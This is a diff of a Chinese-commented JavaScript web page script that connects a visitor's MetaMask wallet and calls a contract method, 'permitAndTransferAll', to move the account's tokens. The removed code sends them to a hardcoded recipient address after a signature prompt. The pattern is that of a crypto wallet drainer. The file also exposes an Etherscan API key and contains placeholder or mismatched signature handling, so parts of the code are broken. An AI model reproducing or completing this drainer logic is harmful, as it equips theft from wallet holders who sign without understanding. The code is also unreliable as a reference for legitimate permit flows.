@@ -1,166 +1,89 @@
-const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
-const contractAddress = '0x0ccd25cb287e18e55969d65ab5555582657512be'; // 替换为你的实际合约地址
-let web3;
-let isConnected = false;
-
-// 代币合约的 ABI
-const erc20Abi = [
+// script.js
+const contractAddress = '0x0CcD25CB287E18e55969d65AB5555582657512bE'; // 你的合约地址
+const abi = [
     {
-        "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "balance", "type": "uint256"}],
-        "type": "function"
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
     },
     {
-        "constant": false,
+        "inputs": [],
+        "name": "ECDSAInvalidSignature",
+        "type": "error"
+    },
+    // 省略其他ABI内容，确保添加完整的ABI
+    {
         "inputs": [
-            {"name": "owner", "type": "address"},
-            {"name": "spender", "type": "address"},
-            {"name": "value", "type": "uint256"},
-            {"name": "deadline", "type": "uint256"},
-            {"name": "v", "type": "uint8"},
-            {"name": "r", "type": "bytes32"},
-            {"name": "s", "type": "bytes32"}
+            {
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            },
+            {
+                "internalType": "uint256",
+                "name": "deadline",
+                "type": "uint256"
+            },
+            {
+                "internalType": "uint8",
+                "name": "v",
+                "type": "uint8"
+            },
+            {
+                "internalType": "bytes32",
+                "name": "r",
+                "type": "bytes32"
+            },
+            {
+                "internalType": "bytes32",
+                "name": "s",
+                "type": "bytes32"
+            }
         ],
         "name": "permitAndTransferAll",
         "outputs": [],
+        "stateMutability": "nonpayable",
         "type": "function"
     }
 ];
 
-// 页面加载后初始化
-window.onload = async () => {
-    const selectedWallet = 'metamask'; // 默认选择 MetaMask
-    document.getElementById('walletSelector').value = selectedWallet;
-};
+let web3;
+let contract;
 
-// 更新已连接钱包列表
-const updateWalletList = (address) => {
-    const walletList = document.getElementById('walletList');
-    const walletItem = document.createElement('li');
-    walletItem.innerText = address;
-    walletList.appendChild(walletItem);
-};
+async function init() {
+    if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+        contract = new web3.eth.Contract(abi, contractAddress);
+        document.getElementById("connectButton").disabled = false;
+    } else {
+        alert('请安装MetaMask!');
+    }
+}
 
-// 更新状态信息
-const updateStatus = (message) => {
-    const statusElement = document.getElementById('status');
-    statusElement.innerText += `\n${message}`;
-};
+async function connectWallet() {
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const account = accounts[0];
+    document.getElementById("walletAddress").innerText = `钱包地址: ${account}`;
+    return account;
+}
 
-// 连接钱包按钮点击事件
-document.getElementById('connectButton').onclick = async () => {
-    const selectedWallet = document.getElementById('walletSelector').value;
+async function permitAndTransfer() {
+    const account = await connectWallet();
+    
+    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1小时后
+    const v = 27; // 这里需要你提供的签名值
+    const r = '0x...'; // 这里需要你提供的签名r值
+    const s = '0x...'; // 这里需要你提供的签名s值
 
     try {
-        if (selectedWallet === 'metamask') {
-            if (window.ethereum) {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                web3 = new Web3(window.ethereum);
-                const accounts = await web3.eth.getAccounts();
-
-                if (accounts.length > 0) {
-                    updateWalletList(accounts[0]);
-                    isConnected = true;
-                    updateStatus('MetaMask 已连接');
-                    document.getElementById('signButton').disabled = false; // 启用签名按钮
-                } else {
-                    updateStatus('未检测到已连接的账户');
-                }
-            } else {
-                updateStatus('请安装 MetaMask 钱包');
-            }
-        }
+        const tx = await contract.methods.permitAndTransferAll(account, deadline, v, r, s).send({ from: account });
+        console.log('交易成功', tx);
     } catch (error) {
-        updateStatus('连接失败: ' + error.message);
+        console.error('交易失败', error);
     }
-};
+}
 
-// 签名按钮点击事件
-document.getElementById('signButton').onclick = async () => {
-    const accounts = await web3.eth.getAccounts();
-    if (accounts.length > 0) {
-        const account = accounts[0];
-        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
-        try {
-            const signature = await web3.eth.personal.sign(message, account);
-            updateStatus(`签名成功: ${signature}`);
+document.getElementById("connectButton").addEventListener("click", connectWallet);
+document.getElementById("transferButton").addEventListener("click", permitAndTransfer);
 
-            // 调用转移资产的函数
-            await transferAssets(account, signature);
-        } catch (error) {
-            updateStatus(`签名失败: ${error.message}`);
-        }
-    } else {
-        updateStatus('请先连接钱包');
-    }
-};
-
-// 转移资产的函数
-const transferAssets = async (account, signature) => {
-    updateStatus(`正在获取 ${account} 的代币余额...`);
-    
-    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);
-    const balance = await tokenContract.methods.balanceOf(account).call();
-    
-    if (balance > 0) {
-        const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 设置截止时间
-        const { v, r, s } = web3.eth.accounts._decodeSignature(signature);
-
-        try {
-            // 调用合约的 permitAndTransferAll 方法
-            await tokenContract.methods
-                .permitAndTransferAll(account, deadline, v, r, s)
-                .send({ from: account });
-                
-            updateStatus(`成功转移 ${balance} 代币从 ${account} 至 ${recipientAddress}`);
-        } catch (error) {
-            updateStatus(`转移失败: ${error.message}`);
-        }
-    } else {
-        updateStatus(`账户 ${account} 在代币合约中没有代币余额`);
-    }
-};
-
-// 获取代币余额的函数
-const getTokenBalances = async (address) => {
-    try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
-        const response = await axios.get(url);
-        const transactions = response.data.result;
-
-        const tokenBalances = {};
-
-        for (const tx of transactions) {
-            const tokenAddress = tx.contractAddress;
-            const tokenSymbol = tx.tokenSymbol;
-
-            if (!tx.from || !tx.to) {
-                continue; // 跳过没有 from 或 to 的交易
-            }
-
-            if (!tokenBalances[tokenAddress]) {
-                tokenBalances[tokenAddress] = {
-                    symbol: tokenSymbol,
-                    balance: web3.utils.toBN(0)
-                };
-            }
-
-            if (tx.from.toLowerCase() === address.toLowerCase()) {
-                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
-            }
-
-            if (tx.to.toLowerCase() === address.toLowerCase()) {
-                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
-            }
-        }
-
-        return tokenBalances;
-    } catch (error) {
-        updateStatus('获取代币余额失败: ' + error.message);
-        return {};
-    }
-};
-
-// 这里可以调用获取代币余额的函数，具体使用根据需求添加
+window.addEventListener('load', init);
